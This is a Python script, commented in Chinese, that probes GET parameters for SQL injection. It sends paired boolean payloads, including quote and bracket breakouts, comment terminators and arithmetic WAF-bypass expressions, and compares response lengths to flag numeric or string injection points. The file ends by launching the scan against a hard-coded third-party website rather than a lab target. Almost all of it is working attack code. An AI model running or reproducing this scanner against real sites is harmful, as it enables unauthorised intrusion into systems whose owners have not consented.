# GET型
# 判断是数字型还是字符型注入
import requests
from termcolor import cprint
from urllib.parse import urlparse

class digit_char_Inject:
    def __init__(self, url):
        self.url = url                                          # url必须是带有http或https协议
        self.standard_length = len(requests.get(self.url).text) # 正常url响应包的长度
        self.params = urlparse(self.url).query                  # 获取url链接的参数
        self.paramsList = self.params.split('&')                # 将字符串型的参数改为以&分割的列表
        #self.schemeNetlocPath = self.url.replace(self.params, '')
        self.Notes = ['--+', '-- ', '%23']           # 注释符
        self.nums = len(self.paramsList) + len(self.paramsList) * len(self.Notes)  # 计算共请求次数
        cprint('[{}] 测试 : [{}] [{}]  :  {}'.format(self.nums, self.standard_length, self.url, self.params),'red')  # 打印正常包的响应长度
        self.num = 1                                            # 计数


    # 返回请求url的响应包长度
    def length_return(self, url):
        return len(requests.get(url).text)

    # 请求数字型payload
    def req_digit_payload(self, url):
        '''
            因为是判断数字型，所以不需要注释符。
        '''
        # digit_bypass可过数字型注入的waf
        digit_bypass = [['1', '0'], ['1-0', '1-1'], ['1+0', '1+1'], ['1*0', '1*1'], ['2/1', '0/1'],
                        ['2<<1', '0<<2'], ['2>>1', '0<<2'], ['1|1', '0|0'], ['1||1', '0||0'],
                        ['1&&1', '0&&1'], ['1^1', '1^0'], ['1%3', '3%3']]

        for i in range(len(self.paramsList)):
            for each in digit_bypass:
                payload1_param = self.paramsList[i] + ' and {}'.format(each[0])     # 构造其中一个参数的payload
                payload1 = self.url.replace(self.paramsList[i], payload1_param) # 构造好的参数payload替换掉原先的参数
                payload_length1 = self.length_return(payload1)       # payload_length1是请求带payload的响应包的长度

                payload2_param = self.paramsList[i] + ' and {}'.format(each[1])
                payload2 = self.url.replace(self.paramsList[i], payload2_param)
                payload_length2 = self.length_return(payload2)
                print('[:] 测试 : [{}] {}'.format(payload_length1, payload1))
                print('[:] 测试 : [{}] {}'.format(payload_length2, payload2))
                # 为了过滤无论and 1=1还是and 1=2页面都不变的注入点, 因为如果都不变，则payload_length1等于payload_length2。例如第一关
                if self.standard_length == payload_length1 and payload_length1 != payload_length2:
                    cprint('[+] 数字型注入  [{}] payload : [{}]'.format(payload_length1, payload1), "red")
                elif self.standard_length != payload_length1:
                    cprint('[+] 可能存在数字注入  [{}] payload : [{}]'.format(payload_length1, payload1), "blue")
                else:
                    cprint('[-] 不是数字型注入。', 'green')


    # 请求字符型payload
    def req_char_payload(self, url):
        '''
            因为是判断字符型，所以需要注释符。
        '''
        quotes_brackets = ["'", '"', "')", "'))", '")', '"))']         # 单引号，双引号，括号  quotes:引号 brackets:括号
        for i in range(len(self.paramsList)):
            for each in quotes_brackets:
                payload1_param = self.paramsList[i] + "{} and 1=1 --+".format(each)
                payload1 = self.url.replace(self.paramsList[i], payload1_param)
                payload_length1 = self.length_return(payload1)  # payload_length1是请求带payload的响应包的长度

                payload2_param = self.paramsList[i] + "{} and 1=2 --+".format(each)
                payload2 = self.url.replace(self.paramsList[i], payload2_param)
                payload_length2 = self.length_return(payload2)
                print('[:] 测试 : [{}] {}'.format(payload_length1, payload1))
                print('[:] 测试 : [{}] {}'.format(payload_length2, payload2))
                # 为了过滤无论and 1=1还是and 1=2页面都不变的注入点, 因为如果都不变，则payload_length1等于payload_length2。例如第一关
                if self.standard_length == payload_length1 and payload_length1 != payload_length2:
                    cprint('[+] 字符型注入  [{}] payload : [{}]'.format(payload_length1, payload1), "red")
                elif self.standard_length != payload_length1:
                    cprint('[+] 可能存在字符型注入  [{}] payload : [{}]'.format(payload_length1, payload1), "blue")
                else:
                    cprint('[-] 不是字符型注入。', 'green')

    def attack(self):
        self.req_digit_payload(self.url)
        self.req_char_payload(self.url)


url1 = "http://www.lifeon.cn/art.php?id=1"
digit_char_Inject(url1).attack()
